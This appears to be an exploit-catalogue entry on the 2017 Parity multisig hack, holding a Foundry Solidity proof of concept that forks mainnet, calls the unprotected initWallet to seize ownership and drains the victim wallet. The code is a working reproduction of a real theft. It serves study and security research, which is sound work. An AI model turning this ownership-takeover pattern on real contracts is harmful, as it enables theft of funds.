# [?] Parity Multisig - delegatecall to unprotected initWallet

## Summary
Severity: Unknown
Chain: EVM
Component: Parity_first_hack
Published: 2017-07-19
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2017-07/Parity_first_hack_exp.sol
Type: defi-exploit-poc

## Details
```solidity
contract ContractTest is Test {
    address internal constant ATTACKER = 0xB3764761E297D6f121e79C32A65829Cd1dDb4D32;
    IParityWallet internal constant VICTIM_WALLET = IParityWallet(0xBEc591De75b8699A3Ba52F073428822d0Bfc0D7e);
    uint256 internal constant FORK_BLOCK = 4_043_799;
    uint256 internal constant STOLEN_AMOUNT = 82_189_932_605_820_062_911_880;

    function setUp() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), FORK_BLOCK);

        vm.label(ATTACKER, "attacker");
        vm.label(address(VICTIM_WALLET), "Parity victim wallet");
    }

    function testExploit() public {
        assertEq(address(VICTIM_WALLET).balance, STOLEN_AMOUNT);
        assertFalse(VICTIM_WALLET.isOwner(ATTACKER));

        address[] memory owners = new address[](1);
        owners[0] = ATTACKER;

        vm.startPrank(ATTACKER);
        VICTIM_WALLET.initWallet(owners, 0, STOLEN_AMOUNT);

        assertTrue(VICTIM_WALLET.isOwner(ATTACKER));

        uint256 attackerBalanceBefore = ATTACKER.balance;
        VICTIM_WALLET.execute(ATTACKER, STOLEN_AMOUNT, "");
        vm.stopPrank();

        assertEq(address(VICTIM_WALLET).balance, 0);
        assertEq(ATTACKER.balance - attackerBalanceBefore, STOLEN_AMOUNT);
    }
}
```
